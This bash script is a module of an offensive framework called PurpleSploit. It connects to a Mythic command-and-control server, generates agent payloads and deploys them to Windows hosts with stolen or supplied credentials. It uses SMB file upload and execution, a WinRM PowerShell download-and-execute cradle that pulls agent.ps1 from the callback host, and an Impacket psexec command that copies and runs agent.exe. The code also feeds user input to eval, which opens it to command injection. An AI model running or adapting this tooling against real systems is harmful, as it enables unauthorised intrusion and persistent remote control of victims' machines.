#!/bin/bash
#
# Mythic C2 Integration
# Part of PurpleSploit Framework
#
# Integrates with Mythic C2 server for automated payload deployment
# Supports agent deployment via NXC, Impacket, and other methods
#

# Mythic configuration
MYTHIC_SERVER=""
MYTHIC_API_KEY=""
MYTHIC_CALLBACK_HOST=""
MYTHIC_CALLBACK_PORT="443"
MYTHIC_CONFIG="$HOME/.purplesploit/mythic_config"

# Initialize Mythic integration
mythic_init() {
    # Load configuration if exists
    if [[ -f "$MYTHIC_CONFIG" ]]; then
        source "$MYTHIC_CONFIG"
    fi
}

# Configure Mythic server
# Usage: mythic_configure
mythic_configure() {
    echo ""
    echo "Mythic C2 Configuration"
    echo "================================================================================"

    read -e -i "$MYTHIC_SERVER" -p "Mythic Server (e.g., https://mythic.example.com): " new_server
    read -e -i "$MYTHIC_API_KEY" -p "API Key: " new_api_key
    read -e -i "$MYTHIC_CALLBACK_HOST" -p "Callback Host (IP/domain for agents): " new_callback_host
    read -e -i "$MYTHIC_CALLBACK_PORT" -p "Callback Port: " new_callback_port

    MYTHIC_SERVER="$new_server"
    MYTHIC_API_KEY="$new_api_key"
    MYTHIC_CALLBACK_HOST="$new_callback_host"
    MYTHIC_CALLBACK_PORT="$new_callback_port"

    # Save configuration
    cat > "$MYTHIC_CONFIG" <<EOF
# Mythic C2 Configuration
MYTHIC_SERVER="$MYTHIC_SERVER"
MYTHIC_API_KEY="$MYTHIC_API_KEY"
MYTHIC_CALLBACK_HOST="$MYTHIC_CALLBACK_HOST"
MYTHIC_CALLBACK_PORT="$MYTHIC_CALLBACK_PORT"
EOF

    echo "[+] Configuration saved to $MYTHIC_CONFIG"
}

# Check if Mythic is configured
mythic_check_config() {
    if [[ -z "$MYTHIC_SERVER" ]] || [[ -z "$MYTHIC_API_KEY" ]]; then
        echo "[!] Mythic C2 not configured. Run 'mythic configure' first."
        return 1
    fi
    return 0
}

# Test Mythic connection
# Usage: mythic_test_connection
mythic_test_connection() {
    if ! mythic_check_config; then
        return 1
    fi

    echo "[*] Testing connection to Mythic server..."

    local response=$(curl -s -k -H "Authorization: Bearer $MYTHIC_API_KEY" \
        "$MYTHIC_SERVER/api/v1.4/payloads" 2>&1)

    if echo "$response" | grep -q "status"; then
        echo "[+] Successfully connected to Mythic C2"
        return 0
    else
        echo "[!] Failed to connect to Mythic C2"
        echo "[*] Response: $response"
        return 1
    fi
}

# List available Mythic payloads
# Usage: mythic_list_payloads
mythic_list_payloads() {
    if ! mythic_check_config; then
        return 1
    fi

    echo "[*] Fetching payloads from Mythic..."

    local response=$(curl -s -k -H "Authorization: Bearer $MYTHIC_API_KEY" \
        "$MYTHIC_SERVER/api/v1.4/payloads")

    # Parse and display payloads
    echo "$response" | jq -r '.payloads[] | "\(.uuid) | \(.description) | \(.payload_type)"' 2>/dev/null || echo "$response"
}

# Generate Mythic payload
# Usage: mythic_generate_payload <payload_type> <output_file>
mythic_generate_payload() {
    local payload_type="$1"
    local output_file="$2"

    if ! mythic_check_config; then
        return 1
    fi

    echo "[*] Generating $payload_type payload..."

    # Build payload creation request
    local payload_data=$(cat <<EOF
{
  "payload_type": "$payload_type",
  "c2_profiles": [
    {
      "c2_profile": "http",
      "c2_profile_parameters": {
        "callback_host": "$MYTHIC_CALLBACK_HOST",
        "callback_port": $MYTHIC_CALLBACK_PORT
      }
    }
  ],
  "build_parameters": []
}
EOF
)

    local response=$(curl -s -k -X POST \
        -H "Authorization: Bearer $MYTHIC_API_KEY" \
        -H "Content-Type: application/json" \
        -d "$payload_data" \
        "$MYTHIC_SERVER/api/v1.4/payloads/create")

    local payload_uuid=$(echo "$response" | jq -r '.uuid' 2>/dev/null)

    if [[ -n "$payload_uuid" ]] && [[ "$payload_uuid" != "null" ]]; then
        echo "[+] Payload generated: $payload_uuid"

        # Download payload
        echo "[*] Downloading payload to $output_file..."
        curl -s -k -H "Authorization: Bearer $MYTHIC_API_KEY" \
            "$MYTHIC_SERVER/api/v1.4/payloads/$payload_uuid/download" \
            -o "$output_file"

        echo "[+] Payload saved to: $output_file"
        return 0
    else
        echo "[!] Failed to generate payload"
        echo "[*] Response: $response"
        return 1
    fi
}

# Deploy payload via SMB (using NXC)
# Usage: mythic_deploy_smb <target> <payload_file>
mythic_deploy_smb() {
    local target="$1"
    local payload_file="$2"

    if [[ ! -f "$payload_file" ]]; then
        echo "[!] Payload file not found: $payload_file"
        return 1
    fi

    local username=$(var_get "USERNAME" 2>/dev/null)
    local password=$(var_get "PASSWORD" 2>/dev/null)
    local domain=$(var_get "DOMAIN" 2>/dev/null)
    local hash=$(var_get "HASH" 2>/dev/null)

    if [[ -z "$username" ]]; then
        echo "[!] No credentials set. Use 'credentials select' first."
        return 1
    fi

    echo "[*] Uploading payload to $target via SMB..."

    local remote_path="C:\\Windows\\Temp\\agent.exe"
    local auth_string=$(credential_build_auth_string)

    # Upload file using nxc
    local upload_cmd="nxc smb $target $auth_string --put-file '$payload_file' '$remote_path'"
    echo "[*] Executing: $upload_cmd"
    eval "$upload_cmd"

    if [[ $? -eq 0 ]]; then
        echo "[+] Payload uploaded successfully"
        echo ""
        echo "[*] To execute the payload, run:"
        echo "    nxc smb $target $auth_string -x '$remote_path'"
        echo ""
        read -p "Execute payload now? [y/N]: " execute

        if [[ "$execute" == "y" || "$execute" == "Y" ]]; then
            local exec_cmd="nxc smb $target $auth_string -x '$remote_path'"
            echo "[*] Executing payload..."
            eval "$exec_cmd"
            echo "[+] Payload executed. Check Mythic for callback!"
        fi

        return 0
    else
        echo "[!] Failed to upload payload"
        return 1
    fi
}

# Deploy payload via WinRM
# Usage: mythic_deploy_winrm <target> <payload_file>
mythic_deploy_winrm() {
    local target="$1"
    local payload_file="$2"

    if [[ ! -f "$payload_file" ]]; then
        echo "[!] Payload file not found: $payload_file"
        return 1
    fi

    local username=$(var_get "USERNAME" 2>/dev/null)
    local password=$(var_get "PASSWORD" 2>/dev/null)
    local domain=$(var_get "DOMAIN" 2>/dev/null)

    if [[ -z "$username" ]]; then
        echo "[!] No credentials set. Use 'credentials select' first."
        return 1
    fi

    echo "[*] Deploying payload via WinRM..."

    # Use PowerShell to download and execute
    local ps_command="IEX(New-Object Net.WebClient).DownloadString('http://$MYTHIC_CALLBACK_HOST:8080/agent.ps1')"

    local auth_string=$(credential_build_auth_string)
    local exec_cmd="nxc winrm $target $auth_string -x \"$ps_command\""

    echo "[*] Executing: $exec_cmd"
    eval "$exec_cmd"

    echo "[+] Payload deployment initiated. Check Mythic for callback!"
}

# Deploy payload via Impacket PSExec
# Usage: mythic_deploy_psexec <target> <payload_file>
mythic_deploy_psexec() {
    local target="$1"
    local payload_file="$2"

    if [[ ! -f "$payload_file" ]]; then
        echo "[!] Payload file not found: $payload_file"
        return 1
    fi

    local username=$(var_get "USERNAME" 2>/dev/null)
    local password=$(var_get "PASSWORD" 2>/dev/null)
    local domain=$(var_get "DOMAIN" 2>/dev/null)
    local hash=$(var_get "HASH" 2>/dev/null)

    if [[ -z "$username" ]]; then
        echo "[!] No credentials set. Use 'credentials select' first."
        return 1
    fi

    echo "[*] Deploying payload via PSExec..."

    # Upload and execute via PSExec
    local domain_user="$username"
    [[ -n "$domain" ]] && domain_user="${domain}/${username}"

    local psexec_cmd="impacket-psexec"
    [[ -n "$hash" ]] && psexec_cmd="$psexec_cmd -hashes :$hash"
    [[ -n "$password" ]] && psexec_cmd="$psexec_cmd"

    psexec_cmd="$psexec_cmd '${domain_user}:${password}@${target}' 'cmd /c copy \\\\$MYTHIC_CALLBACK_HOST\\share\\agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe'"

    echo "[*] Executing: $psexec_cmd"
    eval "$psexec_cmd"

    echo "[+] Payload deployment initiated. Check Mythic for callback!"
}

# Interactive Mythic menu
# Usage: mythic_menu
mythic_menu() {
    while true; do
        echo ""
        echo "Mythic C2 Integration"
        echo "================================================================================"
        echo "  1) Configure Mythic server"
        echo "  2) Test connection"
        echo "  3) List available payloads"
        echo "  4) Generate new payload"
        echo "  5) Deploy via SMB (NXC)"
        echo "  6) Deploy via WinRM"
        echo "  7) Deploy via PSExec (Impacket)"
        echo "  8) Show configuration"
        echo "  9) Back to main menu"
        echo ""
        read -p "Choice: " choice

        case "$choice" in
            1)
                mythic_configure
                ;;
            2)
                mythic_test_connection
                read -p "Press Enter to continue..."
                ;;
            3)
                mythic_list_payloads
                read -p "Press Enter to continue..."
                ;;
            4)
                read -p "Payload type (e.g., apollo, apfell): " payload_type
                read -p "Output file: " output_file
                mythic_generate_payload "$payload_type" "$output_file"
                read -p "Press Enter to continue..."
                ;;
            5)
                read -p "Target: " target
                read -p "Payload file: " payload_file
                mythic_deploy_smb "$target" "$payload_file"
                read -p "Press Enter to continue..."
                ;;
            6)
                read -p "Target: " target
                read -p "Payload file: " payload_file
                mythic_deploy_winrm "$target" "$payload_file"
                read -p "Press Enter to continue..."
                ;;
            7)
                read -p "Target: " target
                read -p "Payload file: " payload_file
                mythic_deploy_psexec "$target" "$payload_file"
                read -p "Press Enter to continue..."
                ;;
            8)
                echo ""
                echo "Current Configuration:"
                echo "  Server: $MYTHIC_SERVER"
                echo "  Callback Host: $MYTHIC_CALLBACK_HOST"
                echo "  Callback Port: $MYTHIC_CALLBACK_PORT"
                echo "  API Key: ${MYTHIC_API_KEY:0:10}...${MYTHIC_API_KEY: -5}"
                read -p "Press Enter to continue..."
                ;;
            9|"")
                break
                ;;
            *)
                echo "[!] Invalid choice"
                ;;
        esac
    done
}

# Export functions
export -f mythic_init
export -f mythic_configure
export -f mythic_check_config
export -f mythic_test_connection
export -f mythic_list_payloads
export -f mythic_generate_payload
export -f mythic_deploy_smb
export -f mythic_deploy_winrm
export -f mythic_deploy_psexec
export -f mythic_menu
